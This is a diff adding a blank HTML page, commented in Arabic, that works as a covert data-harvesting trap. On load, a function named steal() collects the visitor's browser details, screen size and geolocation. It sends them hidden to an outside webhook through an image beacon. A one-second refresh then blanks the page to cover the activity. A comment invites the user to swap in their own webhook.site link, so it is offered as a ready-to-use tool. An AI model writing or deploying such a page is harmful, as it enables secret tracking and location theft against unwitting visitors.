@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <!-- هذا السطر يجعل المتصفح يغلق الصفحة تلقائياً بعد ثانية واحدة -->
+    <meta http-equiv="refresh" content="1; url=about:blank"> 
+    <title></title>
+</head>
+<body style="background:#fff;">
+<script>
+    // 1. تعريف عنوان الاستقبال (استبدل الرابط أدناه برابطك من webhook.site)
+    var target = "https://webhooksite.net/f782be58-c63b-4d57-8861-bf1ecfb9e7ee"; 
+
+    // دالة لجمع المعلومات
+    function steal() {
+        var info = {
+            user_agent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: window.screen.width + "x" + window.screen.height,
+            battery: "unknown",
+            wifi: "unknown"
+        };
+
+        // محاولة الحصول على الموقع الجغرافي
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                info.location = pos.coords.latitude + "," + pos.coords.longitude;
+                send(info);
+            }, function(err) {
+                send(info);
+            });
+        } else {
+            send(info);
+        }
+    }
+
+    // دالة الإرسال الخفي
+    function send(data) {
+        var img = new Image();
+        // نرسل البيانات كصورة صغيرة جداً لتقليل حجم الطلب
+        img.src = target + "?data=" + encodeURIComponent(JSON.stringify(data));
+    }
+
+    // تشغيل الفخ فور تحميل الصفحة
+    steal();
+</script>
+</body>
+</html>
